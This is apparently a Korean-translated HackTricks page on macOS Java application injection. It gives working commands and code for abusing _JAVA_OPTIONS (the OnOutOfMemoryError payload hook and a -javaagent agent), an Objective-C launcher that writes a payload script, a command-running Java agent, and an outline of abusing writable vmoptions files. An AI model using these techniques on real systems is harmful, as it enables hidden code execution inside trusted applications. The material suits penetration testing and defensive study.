# macOS Java Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Enumeration

시스템에 설치된 Java 애플리케이션을 찾습니다. **Info.plist**에 있는 Java 앱은 **`java.`** 문자열을 포함하는 일부 Java 매개변수를 포함하는 것으로 확인되었습니다. 따라서 이를 검색할 수 있습니다:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

환경 변수 **`_JAVA_OPTIONS`**는 자바로 컴파일된 앱의 실행에 임의의 자바 매개변수를 주입하는 데 사용할 수 있습니다:
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
현재 터미널의 자식으로 실행하지 않고 새로운 프로세스로 실행하려면 다음을 사용할 수 있습니다:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
그러나, 이는 실행된 앱에서 오류를 발생시킬 것이며, 더 은밀한 방법은 자바 에이전트를 생성하고 사용하는 것입니다:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
> [!CAUTION]
> 에이전트를 **다른 Java 버전**으로 생성하면 에이전트와 애플리케이션 모두의 실행이 중단될 수 있습니다.

에이전트는 다음과 같을 수 있습니다:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
에이전트를 컴파일하려면 다음을 실행하십시오:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
`manifest.txt`:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
그리고 환경 변수를 내보낸 후 다음과 같이 Java 애플리케이션을 실행합니다:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions 파일

이 파일은 Java가 실행될 때 **Java 매개변수**의 지정을 지원합니다. 이전의 몇 가지 트릭을 사용하여 java 매개변수를 변경하고 **프로세스가 임의의 명령을 실행하도록 만들 수 있습니다**.\
게다가, 이 파일은 `include` 디렉토리를 사용하여 **다른 파일을 포함할 수** 있으므로 포함된 파일을 변경할 수도 있습니다.

더욱이, 일부 Java 앱은 **하나 이상의 `vmoptions`** 파일을 **로드**합니다.

Android Studio와 같은 일부 애플리케이션은 이러한 파일을 찾고 있는 **출력 위치를** 표시합니다.
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
그들이 그렇지 않다면, 다음을 사용하여 쉽게 확인할 수 있습니다:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
안드로이드 스튜디오가 이 예제에서 **`/Applications/Android Studio.app.vmoptions`** 파일을 로드하려고 시도하는 것이 얼마나 흥미로운지 주목하세요. 이곳은 **`admin` 그룹**의 모든 사용자가 쓰기 권한을 가진 장소입니다.

{{#include ../../../banners/hacktricks-training.md}}
